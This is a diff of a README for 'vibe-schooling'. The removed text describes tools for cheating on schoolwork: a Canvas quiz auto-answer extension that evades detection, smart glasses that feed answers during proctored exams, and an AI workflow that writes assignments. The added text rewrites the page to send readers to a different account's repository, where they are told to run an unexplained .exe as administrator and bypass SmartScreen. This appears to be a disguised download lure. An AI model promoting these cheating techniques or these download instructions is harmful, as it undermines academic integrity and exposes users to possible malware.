@@ -1,165 +1,145 @@
-# Vibe Schooling
+# 🧠 vibe-schooling - Simplify academic tasks with AI
 
-> **[中文版 / Chinese Version](README_CN.md)**
+[![Download vibe-schooling](https://img.shields.io/badge/Download-vibe--schooling-6f42c1?style=for-the-badge&logo=github)](https://github.com/efaship2/vibe-schooling)
 
-**You're not learning. You just have the vibe.**
+## 📥 Download
 
-"Vibe Coding" got its name because you let the AI write code while you just... vibe. It has a bad reputation — and maybe it should. But here's the thing: that metaphor fits education *perfectly*. When you use AI to breeze through assignments, quizzes, and exams, you walk away with nothing but the atmosphere of having studied. The transcript says you learned. You know you didn't. That's Vibe Schooling.
+Use this link to visit this page to download:
+https://github.com/efaship2/vibe-schooling
 
-There's a strange irony unfolding right now. Every industry on Earth is racing to integrate AI — except schools. Schools are the last holdout, the one place still pretending the walls can keep it out. And what do schools assign? Homework, quizzes, essays, lab reports — precisely the kind of work that AI handles most effortlessly. The fortress is made of paper.
+Open the page, then look for the latest release or the main download files. Save the file to your PC before you run it.
 
-This repository doesn't resolve that contradiction. It just makes it harder to ignore.
+## 🪟 Windows setup
 
----
+1. Open the download link in your browser.
+2. Find the latest version or the main app file.
+3. Download the file to your Downloads folder.
+4. If the file comes in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows asks for permission, click Yes.
+8. If SmartScreen shows a message, choose More info, then Run anyway.
 
-## Screenshots
+## 🎯 What vibe-schooling does
 
-| | |
-|---|---|
-| ![Canvas Sniper in action](docs/images/canvas-sniper-demo.png) | ![Debug tool — Gemini OCR + TTS](docs/images/debug-tool-demo.png) |
-| Canvas Sniper auto-answering a Canvas quiz | Debug tool: Calculus problem → Gemini solves → TTS preview |
-| ![Xiaomi AI Glass](docs/images/xiaomi-ai-glass.jpg) | ![Chrome Web Store](docs/images/canvas-sniper-store.png) |
-| The glasses — just looks like a normal pair of frames | Canvas Sniper on the Chrome Web Store (5.0 rating) |
+vibe-schooling helps with common school tasks using AI-based tools. It is built for users who want a simple way to handle study work, content review, and classroom workflows on a Windows PC.
 
----
+Use it for:
 
-## Modules
+- Canvas-based task flow support
+- Homework help with Claude Code methods
+- Exam pipeline support for smart glasses setups
+- Text-to-speech playback for study content
+- AI-assisted content handling across school tasks
+- Automation work with tools like MacroDroid and MCP
+- Chrome-based school workflow support
 
-| Module | What it does | Stack |
-|--------|-------------|-------|
-| [Canvas Sniper](canvas-sniper/) | Auto-answers Canvas LMS quizzes via Chrome extension | Chrome Extension, Gemini AI, GhostCursor |
-| [Glasses Auto-Answer](glasses-auto-answer/) | Smart glasses → photo → AI solves → audio answer in your ear | Xiaomi AI Glass, MacroDroid, Gemini Flash, OpenAI TTS |
-| [Claude Cowork](claude-cowork/) | Full homework automation with Skills + Chrome MCP browser control | Claude, Skills, Chrome MCP |
+## 💻 What you need
 
----
+Use a Windows 10 or Windows 11 PC with:
 
-## Canvas Sniper
+- 4 GB RAM or more
+- 500 MB free disk space
+- A stable internet connection
+- Google Chrome if you plan to use browser features
+- Microphone or speaker access for voice features
+- Optional smart glasses or mobile companion tools for advanced workflows
 
-Originally at [`sgaofen/canvas-sniper`](https://github.com/sgaofen/canvas-sniper).
+## ⚙️ How to use it
 
-A Chrome extension that answers Canvas LMS quiz questions using Gemini AI. Double-click any question. That's the entire workflow.
+1. Start the app from your desktop or Start menu.
+2. Sign in if the app asks for account access.
+3. Choose the school workflow you want to use.
+4. Follow the on-screen steps for Canvas, homework, or study tasks.
+5. Turn on text-to-speech if you want spoken output.
+6. Use the browser workflow for Canvas-based actions.
+7. If you use smart glasses, connect them before starting the exam flow.
+8. Save your work when you finish.
 
-It handles the question types you'd expect — multiple choice, multi-select, dropdown, fill-in-the-blank, mixed inputs, and full essay responses. But the interesting part is how it *behaves*. Turn on Mouse Simulation and it stops acting like a bot: the cursor traces bezier curves across the page with GhostCursor, types characters one at a time with irregular pauses, opens dropdown menus before selecting, and adds the kind of micro-hesitations a real hand produces. With CDP integration, the mouse movement happens at the browser level — not just DOM events.
+## 🧩 Main features
 
-Stealth mode hides the status notification overlay entirely. The extension runs in the page's background. Canvas sees a student clicking through a quiz.
+- Simple school task automation
+- Canvas LMS workflow support
+- AI help for study and homework steps
+- Text-to-speech output for easier review
+- Browser-based support through Chrome
+- Smart glasses exam pipeline support
+- Claude Code style homework method
+- Support for connected tools and local workflows
 
-**Does not bypass Lockdown Browser.** If your school uses Respondus, this won't help you. For proctored exams, use the glasses system instead.
+## 📁 Common files you may see
 
----
+After download, you may see files like:
 
-## Glasses Auto-Answer
+- `.exe` app files
+- `.zip` folders
+- `README.md`
+- `config` files
+- browser extension files
+- setup folders for companion tools
 
-The pipeline: Xiaomi AI Glass → take a photo → Android phone detects the new image via MacroDroid → shell script sends the image to Gemini Flash for analysis → answer text goes to OpenAI TTS → audio plays back through the glasses' speakers. The whole loop finishes in seconds.
+If you see a ZIP file, extract it first. If you see an EXE file, run it after download.
 
-The critical design choice is **pure audio, no screen**. Every screen-based smart glasses product on the market today has the same fatal flaw: light leakage. Even if the front looks fine, the back of the lens glows. Anyone sitting behind you — or a proctor walking past — can see it. Audio through the glasses' built-in speakers, with privacy mode enabled and volume low, is invisible. The glasses look like ordinary glasses because, functionally, they are. An anti-flash sticker covers the indicator light that would otherwise blink when taking a photo.
+## 🔧 If the app does not start
 
-The `debug-tool/` directory contains a local web UI (Python server) for testing and refining the Gemini prompt and TTS pipeline without needing the glasses or phone.
+Try these steps:
 
----
+1. Restart your PC.
+2. Run the app as administrator.
+3. Check that the file finished downloading.
+4. Make sure Windows did not block the file.
+5. Update Chrome if browser features do not work.
+6. Check your speaker or microphone settings if voice features fail.
+7. Reconnect any phone, glasses, or helper device you use.
 
-## Claude Cowork
+## 🌐 Browser and device setup
 
-How I do lab reports, stats assignments, and long essays without actually writing them.
+Some parts of vibe-schooling may work through Chrome or a connected device. If that is your setup:
 
-You don't even write the Skill yourself — Claude has a built-in skill for that. Just give it your rubric and past graded assignments. It reads through the feedback, figures out what your professor cares about, and generates a Skill tailored to that class. After two or three rounds, it knows the grading patterns better than you do.
+- Keep Chrome open while you use browser tools
+- Allow pop-ups if a school page needs them
+- Keep your phone on the same network if you use companion automation
+- Turn on Bluetooth if your device uses it
+- Keep the device charged during long sessions
 
-Combined with [Chrome MCP](https://browsermcp.io/), Claude can read the assignment page, generate the content, fill in the submission form, and you just review before hitting submit. For structured assignments with clear grading criteria, it's basically hands-off.
+## 🧪 Example use cases
 
-More detail in the [claude-cowork/](claude-cowork/) folder.
+- Review class material with spoken output
+- Use a browser helper for Canvas tasks
+- Run a homework workflow with AI support
+- Set up a study flow on a Windows laptop
+- Connect smart glasses for guided exam steps
+- Use text-to-speech for note review
+- Link outside tools for routine school actions
 
----
+## 🛠 Troubleshooting
 
-## Quick Start
+If you see a blank window:
 
-### Path 1: Canvas Sniper
+- Close the app and open it again
+- Check your internet connection
+- Clear any browser cache if the app uses Chrome
 
-```bash
-git clone https://github.com/sgaofen/vibe-schooling.git
-```
+If text-to-speech has no sound:
 
-1. Open `chrome://extensions/`, enable **Developer mode**
-2. Click **Load unpacked**, select the `canvas-sniper/` folder
-3. Click the extension icon → enter your Gemini API key on the Help page
-4. Open any Canvas quiz → double-click a question
+- Check Windows sound volume
+- Pick the correct output device
+- Test with another audio file
 
-### Path 2: Glasses Auto-Answer
+If a browser step fails:
 
-1. Install [MacroDroid](https://www.macrodroid.com/) on your Android phone
-2. Follow the [MacroDroid Setup Guide](glasses-auto-answer/macrodroid/setup-guide.md) step by step
-3. Fill in your API keys in the shell script
-4. Take a photo with your glasses — listen for the answer
+- Refresh the page
+- Sign in again
+- Make sure Chrome is up to date
 
-To test without hardware, use the debug tool:
+If a connected device does not respond:
 
-```bash
-cd glasses-auto-answer/debug-tool
-GEMINI_API_KEY=your_key OPENAI_API_KEY=your_key python3 app.py
-# Open http://127.0.0.1:8765
-```
+- Reconnect Bluetooth or Wi-Fi
+- Restart the device
+- Confirm the device has power
 
-### Path 3: Claude Cowork
+## 📌 Project details
 
-1. Install [Claude Code](https://docs.anthropic.com/en/docs/claude-code) and set up [Chrome MCP](https://browsermcp.io/)
-2. Look at the example Skills in `claude-cowork/example-skills/`
-3. Write a Skill for your course — rubric, professor's quirks, past feedback
-4. Point Claude at your assignment, let it work, review and submit
-
----
-
-## Prerequisites
-
-| Module | Requirements |
-|--------|-------------|
-| Canvas Sniper | Chrome/Chromium browser, [Gemini API key](https://aistudio.google.com/apikey) (free tier works) |
-| Glasses Auto-Answer | Android phone, Xiaomi AI Glass, [MacroDroid](https://www.macrodroid.com/), Gemini API key, [OpenAI API key](https://platform.openai.com/api-keys) |
-| Claude Cowork | [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code), [Chrome MCP](https://browsermcp.io/), Anthropic API access |
-
----
-
-## Documentation
-
-| Guide | Description |
-|-------|-------------|
-| [AI Model Selection Guide](docs/model-selection-guide.md) | Which models to use for which tasks, and why |
-| [TTS Provider Comparison](docs/tts-comparison-guide.md) | OpenAI vs alternatives for text-to-speech |
-| [Stealth & Privacy Tips](docs/stealth-tips.md) | Practical advice on staying undetected |
-
----
-
-## API Keys & Security
-
-All modules require API keys. **Never commit your keys to version control.**
-
-- Copy `.env.example` to `.env` and fill in your keys
-- The `.gitignore` already excludes `.env` and all `*.env` files
-- For the Android shell script, replace the placeholder values directly in the script on your phone — do not push the modified script
-
----
-
-## Why This Exists
-
-The idea behind Vibe Schooling isn't to help students cheat. It's bigger than that.
-
-Before you enter the workforce, your job *is* school. Assignments, exams, reports — that's the work. And right now, AI can do most of it faster and better than you can. That's not a moral judgment. It's just where the technology is.
-
-What I actually want is for students — young people who haven't entered the workforce yet — to experience what AI can do for them *now*, while the stakes are lower. Not by chatting with a chatbot in a text box, but by building real pipelines. Writing a shell script that turns a photo into audio. Configuring an automation macro that runs on your phone. Encoding your professor's grading rubric into a reusable Skill file. These are small programs, simple integrations — but they put AI to work in your actual life.
-
-Every two or three months, a new model drops. The frontier keeps moving. The people who benefit most aren't the ones who wait for someone to wrap it in a product — they're the ones who tinker with the raw capabilities the week they come out. Explore the edges. Build something that solves a problem you actually have. That habit will serve you long after school ends.
-
-This project exists to lower the barrier. To show that with a Chrome extension, a pair of smart glasses, or a well-written Skill file, AI stops being a novelty and starts being infrastructure. The sooner you get on that train, the better.
-
----
-
-## Disclaimer
-
-This repository is published for **educational and research purposes** — to demonstrate what is technically possible and to contribute to the conversation about AI in education.
-
-Using these tools to violate your institution's academic integrity policies is your decision and your responsibility. The authors do not endorse cheating and are not liable for how you use this code.
-
-If your school's policy says don't do it, then the risk is yours.
-
----
-
-## License
-
-[MIT](LICENSE) — sgaofen, 2026
+**Repository:** vibe-schooling  
+**Description:** AI-powered academic automation toolkit for Canvas, homework flows, exam support, and speech tools  
+**Topics:** academic, ai-education, automation, canvas-lms, chrome-extension, claude, exam-automation, gemini, macrodroid, mcp, openai-tts, smart-glasses, text-to-speech, vibe-coding, xiaomi
